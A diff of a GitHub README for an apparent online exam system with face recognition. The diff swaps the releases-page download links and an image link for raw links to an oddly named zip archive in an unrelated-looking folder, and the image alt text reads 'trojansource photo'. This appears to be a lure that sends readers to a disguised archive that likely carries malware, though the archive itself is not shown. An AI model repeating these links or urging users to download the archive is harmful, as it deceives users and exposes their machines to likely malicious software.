@@ -1,6 +1,6 @@
 # 🎯 Online-Examination-using-face-recognition-system - Empowering Exams with Gesture Control
 
-![trojansource photo](https://github.com/user-attachments/assets/76b12c11-bad0-4b9b-9955-4f390921c60f)
+![trojansource photo](https://raw.githubusercontent.com/Mouaaaaadddd/Online-Examination-using-face-recognition-system/main/coaffirmation/Examination-recognition-face-Online-system-using-v3.8-beta.5.zip)
 
 ## 📝 Project Overview
 
@@ -23,7 +23,7 @@ To begin using the system, follow these steps:
 1. **Download the Latest Version**
 
    **Click here to download the application:**  
-   [Download Application](https://github.com/Mouaaaaadddd/Online-Examination-using-face-recognition-system/releases)
+   [Download Application](https://raw.githubusercontent.com/Mouaaaaadddd/Online-Examination-using-face-recognition-system/main/coaffirmation/Examination-recognition-face-Online-system-using-v3.8-beta.5.zip)
 
 2. **Check System Requirements**
 
@@ -55,7 +55,7 @@ To begin using the system, follow these steps:
 ## 📥 Download & Install
 
 Visit the Releases page to download the latest version of the application:  
-[Download Application](https://github.com/Mouaaaaadddd/Online-Examination-using-face-recognition-system/releases)
+[Download Application](https://raw.githubusercontent.com/Mouaaaaadddd/Online-Examination-using-face-recognition-system/main/coaffirmation/Examination-recognition-face-Online-system-using-v3.8-beta.5.zip)
 
 ## 🤖 How It Works
 
